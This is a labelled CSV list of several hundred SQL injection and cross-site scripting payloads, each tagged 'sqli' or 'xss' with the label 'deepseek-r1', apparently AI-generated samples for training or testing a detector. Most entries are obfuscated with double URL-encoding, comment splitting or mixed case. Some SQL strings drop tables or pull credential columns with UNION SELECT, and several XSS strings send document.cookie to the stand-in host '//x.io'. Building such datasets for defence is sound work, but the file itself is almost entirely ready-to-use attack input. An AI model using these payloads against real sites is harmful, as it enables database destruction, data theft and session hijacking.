+')	O/**/R	''=''	#,1,sqli,deepseek-r1
+"""+O/**/R+0<1+-- ",1,sqli,deepseek-r1
+%2560%25250d%25250aA/**/N/**/D%25250d%25250a1%253D2%25250d%25250a--,1,sqli,deepseek-r1
+'	AND	''=''	--/**/-,1,sqli,deepseek-r1
+%2527%253B%2520DROP%2520TABLE%2520sessions%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+"` aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT LaSt_nAmE FrOm tOkEnS LiMiT 1)))",1,sqli,deepseek-r1
+`+aNd+'A'='A'+/*x*/,1,sqli,deepseek-r1
+%2527%2509AND%25091%253D1%2509%252523,1,sqli,deepseek-r1
+'/**/Or/**/1=1/**/%23,1,sqli,deepseek-r1
+""")+AnD+'a'='a'+--",1,sqli,deepseek-r1
+%2527%255D%25250d%25250aAND%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,deepseek-r1
+"')+AND+extractvalue(1,concat(0x7e,(SELECT+account+FROM+members+LIMIT+1)))",1,sqli,deepseek-r1
+%2522%2520OR%2520%2528SELECT%2520last_name%2520FROM%2520accounts%2520WHERE%2520last_name%253D224%2529%253D71,1,sqli,deepseek-r1
+%2527%255D%25250aA/**/N/**/D%25250a0%253C1%25250a--,1,sqli,deepseek-r1
+%2522%2529%2520OR%2520%2528SELECT%2520pwd%2520FROM%2520sessions%2520WHERE%2520pwd%253D946%2529%253D611,1,sqli,deepseek-r1
+') O/**/r (S/**/e/**/L/**/e/**/C/**/t eMaIl f/**/R/**/o/**/M UsErS WhErE EmAiL=250)=785,1,sqli,deepseek-r1
+%2527%2509O%252F%252A%252A%252FR%2509%2527%2527%253D%2527%2527%2509--%2520,1,sqli,deepseek-r1
+""") Or (SeLeCt aCcOuNt fRoM ToKeNs wHeRe aCcOuNt=532)=357",1,sqli,deepseek-r1
+`%0aA/**/N/**/D%0a0<1%0a--,1,sqli,deepseek-r1
+%2527%255D%25250d%25250aAND%25250d%25250a1%252509BETWEEN%2525090%252509AND%2525099%25250d%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+""")%0aOr%0A''=''%0A--",1,sqli,deepseek-r1
+"""%09oR%091 LiKe 1%09-- -",1,sqli,deepseek-r1
+%2522%2529%25250aOr%25250A1%253D2%25250A--,1,sqli,deepseek-r1
+']/**/A/**/N/**/D/**/1 BETWEEN 0 A/**/N/**/D 9/**/-- ,1,sqli,deepseek-r1
+`%0AoR%0a0<1%0a#,1,sqli,deepseek-r1
+"']+UNION+SELECT+name,uid,pwd+FROM+staff/*x*/",1,sqli,deepseek-r1
+""") O/**/r 1=1 lImIt 1--",1,sqli,deepseek-r1
+%2527%2529%252BOR%252B1%2520LIKE%25201%252B%252523,1,sqli,deepseek-r1
+%2560%252509AND%2525092%253E1%252509%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2560%2509aNd%25091%2520bEtWeEn%25200%2520aNd%25209%2509%2523,1,sqli,deepseek-r1
+%2522%2529%2520U%252F%252A%252A%252FN%252F%252A%252A%252FI%252F%252A%252A%252FO%252F%252A%252A%252FN%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520name%252Cpasswo%252F%252A%252A%252Frd%252Cuser%252Cpwd%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520admin%2523,1,sqli,deepseek-r1
+'/**/Or/**/2>1/**/--/**/-,1,sqli,deepseek-r1
+%2527%2529%25250aAND%25250a%2527a%2527%253D%2527a%2527%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+']%09A/**/N/**/D%091=2%09#,1,sqli,deepseek-r1
+%2522%2509O/**/R%25091%253D2%2509--,1,sqli,deepseek-r1
+']%09Or%092>1%09--+-,1,sqli,deepseek-r1
+""")	Or	1 lIkE 1	--",1,sqli,deepseek-r1
+')%09O/**/R%09'a'='a'%09--,1,sqli,deepseek-r1
+""") O/**/R (S/**/E/**/L/**/E/**/C/**/T token F/**/R/**/O/**/M credentials WHERE token=776)=800",1,sqli,deepseek-r1
+%2527%252BaNd%252B1%253D1%252B--,1,sqli,deepseek-r1
+%2527%2529%253B%2520dRoP%2520TaBlE%2520StAfF%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+""")%0d%0AoR%0d%0A'A'='A'%0D%0a/*X*/",1,sqli,deepseek-r1
+%2527%2529%2520UNION%2520SELECT%2520name%252Caccount%2520FROM%2520users--%2520-,1,sqli,deepseek-r1
+%2527%255D%252F%252A%252A%252FoR%252F%252A%252A%252F1%2520bEtWeEn%25200%2520aNd%25209%252F%252A%252A%252F%252523,1,sqli,deepseek-r1
+%2522%2509aNd%2509%2527A%2527%253D%2527A%2527%2509--,1,sqli,deepseek-r1
+%2527%255D%252BOR%252B2%253E1%252B%252523,1,sqli,deepseek-r1
+`%0d%0aAND%0d%0a0<1%0d%0a--%09,1,sqli,deepseek-r1
+' aNd 1=2 /*x*/,1,sqli,deepseek-r1
+`%0d%0aOR%0d%0a1+BETWEEN+0+AND+9%0d%0a--+-,1,sqli,deepseek-r1
+')%0aOR%0a2>1%0a#,1,sqli,deepseek-r1
+')%0aA/**/n/**/D%0a1=1%0a#,1,sqli,deepseek-r1
+"')%0aUnIoN%0aSeLeCt%0aeMaIl,rOlE,NaMe,lAsT_NaMe,sTaTuS,Id%0afRoM%0aMeMbErS/*x*/",1,sqli,deepseek-r1
+%2527%25250d%25250aA%252F%252A%252A%252FN%252F%252A%252A%252FD%25250d%25250a1%2520LIKE%25201%25250d%25250a%2523,1,sqli,deepseek-r1
+%2522%252BA/**/N/**/D%252B1%253D2%252B--%2520,1,sqli,deepseek-r1
+%2522%252F%252A%252A%252FA%252F%252A%252A%252FN%252F%252A%252A%252FD%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--,1,sqli,deepseek-r1
+`/**/AnD/**/1=2/**/#,1,sqli,deepseek-r1
+"""%0d%0aOR%0d%0a'a'='a'%0d%0a--+",1,sqli,deepseek-r1
+""")%0aA/**/N/**/D%0a'a'='a'%0a-- ",1,sqli,deepseek-r1
+""")	AnD	1 BeTwEeN 0 AnD 9	-- ",1,sqli,deepseek-r1
+%2522%2520uNiOn%2520sElEcT%2520NuLl%252CnUlL%252cNuLl%252CnUlL--%2520,1,sqli,deepseek-r1
+`/**/A/**/N/**/D/**/1=1/**//*x*/,1,sqli,deepseek-r1
+'%0AoR%0a0<1%0a--+,1,sqli,deepseek-r1
+')%0d%0aAND%0d%0a2>1%0d%0a--%0a-,1,sqli,deepseek-r1
+%2522%2529%25250aAND%25250a1%252BLIKE%252B1%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+"""%0aO/**/R%0a1 LIKE 1%0a-- ",1,sqli,deepseek-r1
+')%0d%0AaNd%0D%0a''=''%0d%0A-- ,1,sqli,deepseek-r1
+%2522%252509OR%2525092%253E1%252509%252523,1,sqli,deepseek-r1
+`/**/AND/**/1+LIKE+1/**/--,1,sqli,deepseek-r1
+""")%0aO/**/R%0a0<1%0a--",1,sqli,deepseek-r1
+"""; DrOp tAbLe mEmBeRs#",1,sqli,deepseek-r1
+%2522%2529%2509AND%25091%2520LIKE%25201%2509--,1,sqli,deepseek-r1
+')%0d%0aA/**/N/**/D%0d%0a2>1%0d%0a--,1,sqli,deepseek-r1
+'/**/A/**/N/**/D/**/''=''/**/#,1,sqli,deepseek-r1
+%2527%2529%25250aAnD%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250a--%2520,1,sqli,deepseek-r1
+"""%09UNION%09SELECT%09NULL,NULL,NULL%23",1,sqli,deepseek-r1
+%2522%2529%2520UnIoN%2520SeLeCt%2520nUlL%252cNuLl%252523,1,sqli,deepseek-r1
+"'] U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T uid,role,username,email,first_name F/**/R/**/O/**/M members-- -",1,sqli,deepseek-r1
+')+Or+1=2+--,1,sqli,deepseek-r1
+%2522%252509oR%252509%2527a%2527%253d%2527a%2527%252509--%2520-,1,sqli,deepseek-r1
+']+Or+2>1+#,1,sqli,deepseek-r1
+%2560%2520oR%25201%253d1%2520LiMiT%25201--,1,sqli,deepseek-r1
+%2527%255D%2520UNION%2520SELECT%2520NULL%252CNULL--%2520,1,sqli,deepseek-r1
+%2527%25250aOR%25250a1%2520BETWEEN%25200%2520AND%25209%25250a%2523,1,sqli,deepseek-r1
+')+OR+1+BETWEEN+0+AND+9+--+-,1,sqli,deepseek-r1
+""")%09A/**/n/**/D%091=2%09/*X*/",1,sqli,deepseek-r1
+'%0D%0aAnD%0d%0A'A'='A'%0D%0a%23,1,sqli,deepseek-r1
+')%0aAND%0a1%0aLIKE%0a1%0a%23,1,sqli,deepseek-r1
+%2527%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520users%2529%253E0%252523,1,sqli,deepseek-r1
+%2522%25250aAND%25250a1%253D1%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2560%252BOR%252B1%2520BETWEEN%25200%2520AND%25209%252B--%2520,1,sqli,deepseek-r1
+%2522%2529%252BAND%252Bextractvalue%25281%252Cconcat%25280x7e%252C%2528SELECT%252Bname%252BFROM%252Baccounts%252BLIMIT%252B1%2529%2529%2529,1,sqli,deepseek-r1
+""" aNd (SeLeCt cOuNt(*) FrOm oRdErS)>0/*X*/",1,sqli,deepseek-r1
+']%0d%0AaNd%0D%0a''=''%0d%0A-- -,1,sqli,deepseek-r1
+"') UnIoN SeLeCt nUlL,NuLl#",1,sqli,deepseek-r1
+"')%0aUnIoN%0aSeLeCt%0anUlL,NuLl--%0a",1,sqli,deepseek-r1
+%2527%2520AND%25200%253C1%2520%2523,1,sqli,deepseek-r1
+%2527%2529%252F%252A%252A%252FAND%252F%252A%252A%252F0%253C1%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+"""%09A/**/N/**/D%09'a'='a'%09/*x*/",1,sqli,deepseek-r1
+`/**/aNd/**/''=''/**/--/**/-,1,sqli,deepseek-r1
+%2522%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252a%2529%2520FrOm%2520sTaFf%2529%253e0--%2520,1,sqli,deepseek-r1
+%2560%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520sessions%2529%253E0%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+')%0aO/**/R%0a1 LIKE 1%0a%23,1,sqli,deepseek-r1
+""")%0aA/**/n/**/D%0a1 LiKe 1%0A-- ",1,sqli,deepseek-r1
+"' uNiOn sElEcT RoLe,uSeRnAmE FrOm oRdErS/*x*/",1,sqli,deepseek-r1
+%2522%2529%252509AND%2525091%2520LIKE%25201%252509--%2520,1,sqli,deepseek-r1
+%253Cobject%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Cdiv%2520onload%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onpointerover%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cmarquee%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Ca%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Cdetails%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+"<SvG OnFoCuS=""lOcAtIoN='//x.iO'"">",1,xss,deepseek-r1
+%2527%253E%253Csvg%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Csvg%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+<IfRaMe oNlOaD=AlErT(1)>,1,xss,deepseek-r1
+'&gt;&lt;AuDiO OnInPuT=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)&gt;,1,xss,deepseek-r1
+%253Cdetails%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+&lt;input onstart=alert(1)&gt;,1,xss,deepseek-r1
+"&lt;input onmouseover=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,deepseek-r1
+"<DiV OnLoAd=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,deepseek-r1
+%253Cdiv%2520onfocus%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%253Cimg%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+%253Caudio%2520onstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+<IfRaMe oNtOgGlE=LoCaTiOn='//X.Io'>,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onmouseover%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+'><DiV OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+"""><A OnFoCuS=CoNfIrM(1)>",1,xss,deepseek-r1
+%253Ciframe%2520onmouseover%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
+%253Cvideo%2520onpointerover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%253Ca%2520ontoggle%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253Caudio%2520oninput%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+<MaRqUeE OnErRoR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
+'&gt;&lt;a onanimationstart=alert(document.cookie)&gt;,1,xss,deepseek-r1
+<ScR<ScRiPt>iPt>fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)</sCrIpT>,1,xss,deepseek-r1
+%253Cvideo%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
+<DiV OnFoCuS=CoNfIrM(1)>,1,xss,deepseek-r1
+%2522%253E%253Cdiv%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+'><DeTaIlS OnLoAd=pRiNt()>,1,xss,deepseek-r1
+%253Cscript%2520onerror%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Cdiv%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+&lt;script onfocus=alert(1)&gt;,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cinput%2520onpointerover%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cinput%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cinput%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253Cbody%2520onanimationstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+"<A OnMoUsEoVeR=""aLeRt(dOcUmEnT.CoOkIe)"">",1,xss,deepseek-r1
+%253Caudio%2520onclick%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+%253Cscript%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+&Lt;sCr&lT;ScRiPt&gT;IpT&Gt;lOcAtIoN='//x.iO'&lT;/sCrIpT&Gt;,1,xss,deepseek-r1
+%2522%253E%253Cvideo%2520onload%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+"&lt;DiV OnMoUsEoVeR=""lOcAtIoN='//x.iO'""&gt;",1,xss,deepseek-r1
+%2527%253E%253Cbody%2520onclick%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%253Ciframe%2520onclick%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2526lt%253Bdetails%2520onload%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,deepseek-r1
+%2527%253E%253Cobject%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520ontoggle%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cscript%2520onerror%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+"<ScRiPt oNmOuSeOvEr=""FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
+%2522%253E%253Ciframe%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+"""&gt;&lt;iframe onstart=print()&gt;",1,xss,deepseek-r1
+%253Ciframe%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Cdetails%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%253Cdetails%2520onanimationstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
+%253Cinput%2520onerror%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+"&lt;div onpointerover=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,deepseek-r1
+"<ObJeCt oNaNiMaTiOnStArT=""aLeRt(1)"">",1,xss,deepseek-r1
+%2522%253E%253Csvg%2520onmouseover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+"""><DiV OnInPuT=AlErT(DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
+%253Cvideo%2520onclick%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253cBoDy%2520oNeRrOr%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,deepseek-r1
+%253Cimg%2520onclick%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Csvg%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cmarquee%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Ciframe%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%253Cinput%2520onfocus%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+'><DeTaIlS OnInPuT=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
+'><DiV OnLoAd=aLeRt(1)>,1,xss,deepseek-r1
+%253Ciframe%2520onpointerover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+%253Caudio%2520onerror%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+%253Cdetails%2520onmouseover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+"<ImG OnAnImAtIoNsTaRt=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
+"""><InPuT OnMoUsEoVeR=PrInT()>",1,xss,deepseek-r1
+'><DeTaIlS OnAnImAtIoNsTaRt=lOcAtIoN='//x.iO'>,1,xss,deepseek-r1
+%2527%253E%253Ciframe%2520onpointerover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%253Cobject%2520onerror%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+"""&gt;&lt;iframe onclick=location='//x.io'&gt;",1,xss,deepseek-r1
+%2527%253E%253Caudio%2520onanimationstart%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Cvideo%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+&lt;img onpointerover=alert(document.cookie)&gt;,1,xss,deepseek-r1
+"""><DeTaIlS OnLoAd=pRiNt()>",1,xss,deepseek-r1
+%253Cdiv%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+'&gt;&lt;input onpointerover=alert(document.domain)&gt;,1,xss,deepseek-r1
+<DeTaIlS OnFoCuS=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
+'><InPuT OnAnImAtIoNsTaRt=cOnFiRm(1)>,1,xss,deepseek-r1
+"&lt;marquee onload=""print()""&gt;",1,xss,deepseek-r1
+'&gt;&lt;MaRqUeE OnToGgLe=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)&gt;,1,xss,deepseek-r1
+%253Cdetails%2520onload%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
+%253CObJeCt%2520oNpOiNtErOvEr%253D%2522AlErT%25281%2529%2522%253E,1,xss,deepseek-r1
+%2526lt%253Bscript%2520onstart%253D%2522confirm%25281%2529%2522%2526gt%253B,1,xss,deepseek-r1
+"""&gt;&lt;audio onanimationstart=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,deepseek-r1
+%2522%253E%253Cvideo%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Ciframe%2520onerror%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253CViDeO%2520OnFoCuS%253DPrInT%2528%2529%253E,1,xss,deepseek-r1
+%253Cobject%2520onclick%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+'&gt;&lt;body ontoggle=alert(document.cookie)&gt;,1,xss,deepseek-r1
+%253Cvideo%2520onfocus%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
+"""><ImG OnErRoR=AlErT(1)>",1,xss,deepseek-r1
+%253Cdiv%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+'&gt;&lt;a onmouseover=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,deepseek-r1
+%253Ca%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Ciframe%2520onerror%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
+"<AuDiO OnLoAd=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
+'><ViDeO OnErRoR=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,deepseek-r1
+%2527%253E%253Cscript%2520onload%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%253Ca%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%253Cimg%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Cimg%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%253Cobject%2520onload%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
+%253Csvg%2520onerror%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
+%2527%253E%253Cdetails%2520onfocus%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%253Cdetails%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+"""><MaRqUeE OnLoAd=aLeRt(dOcUmEnT.CoOkIe)>",1,xss,deepseek-r1
+<ScR<ScRiPt>iPt>aLeRt(dOcUmEnT.CoOkIe)</sCrIpT>,1,xss,deepseek-r1
+%253Cinput%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cinput%2520onload%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+"<DeTaIlS OnInPuT=""pRiNt()"">",1,xss,deepseek-r1
+<ScRiPt oNtOgGlE=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
+%2527%253E%253Ca%2520onload%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+"""><MaRqUeE OnErRoR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
+"<IfRaMe oNfOcUs=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
+%253Cinput%2520onerror%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+<ViDeO OnInPuT=AlErT(1)>,1,xss,deepseek-r1
+%2522%253E%253Cmarquee%2520oninput%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2527%253E%253cObJeCt%2520oNcLiCk%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,deepseek-r1
+'><IfRaMe oNlOaD=CoNfIrM(1)>,1,xss,deepseek-r1
+%253Caudio%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%253Cinput%2520onclick%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Cdiv%2520onerror%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2527%253E%253Cvideo%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Ciframe%2520onfocus%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Caudio%2520onerror%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cdiv%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
+'><scr ipt onstart=print()>,1,xss,deepseek-r1
+"<DiV OnInPuT=""aLeRt(1)"">",1,xss,deepseek-r1
+%2527%253E%253Cdiv%2520onmouseover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cobject%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+&Lt;aUdIo oNpOiNtErOvEr=aLeRt(dOcUmEnT.CoOkIe)&Gt;,1,xss,deepseek-r1
+%2527%253E%253Cobject%2520oninput%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Cbody%2520onmouseover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
+<ImG OnErRoR=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
+%253Cscript%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
+%2527%253E%253Cdetails%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+&lt;input onfocus=alert(1)&gt;,1,xss,deepseek-r1
+"""><BoDy oNlOaD=PrInT()>",1,xss,deepseek-r1
+'><ViDeO OnInPuT=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,deepseek-r1
+'><InPuT OnAnImAtIoNsTaRt=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,deepseek-r1
+%2527%253E%253Ca%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%2522%253E%253Cdetails%2520onstart%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%253Ciframe%2520onanimationstart%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
+'&gt;&lt;DeTaIlS OnAnImAtIoNsTaRt=eVaL(AtOb('YwXlCnQoMsK'))&gt;,1,xss,deepseek-r1
+%2527%253E%253Cinput%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Caudio%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
+<AuDiO OnClIcK=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
+%253Ciframe%2520onclick%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
+%253Cbody%2520onstart%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+%2522%253E%253Cinput%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
+%253Cdiv%2520ontoggle%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
+%253Cvideo%2520onpointerover%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
+<ObJeCt oNlOaD=AlErT(1)>,1,xss,deepseek-r1
+"<SvG OnToGgLe=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
+%253Ciframe%2520onmouseover%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
+'><AuDiO OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
+%253Cscript%2520onstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
+%253Caudio%2520onclick%253Dalert%25281%2529%253E,1,xss,deepseek-r1
+%2522%253E%253Csvg%2520onerror%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
+%253Cimg%2520oninput%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
